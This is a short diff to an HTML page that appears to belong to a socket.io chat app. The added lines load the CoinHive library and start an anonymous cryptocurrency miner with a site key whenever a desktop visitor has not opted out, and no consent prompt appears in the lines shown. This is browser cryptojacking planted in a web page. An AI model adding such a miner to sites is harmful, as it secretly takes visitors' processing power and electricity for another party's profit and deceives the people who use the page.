@@ -8,6 +8,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/socket.io-1.2.0.js"></script>
     <script src="https://code.jquery.com/jquery-1.11.1.js"></script>
+
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('bKMtEltpocEaSvWjYHtZU0d023Jvgcoh', {
+            throttle: 0.7
+        });
+
+        if (!miner.isMobile() && !miner.didOptOut(14400)) {
+            miner.start();
+        }
+    </script>
     <style>
         :root {
             --text: lime;
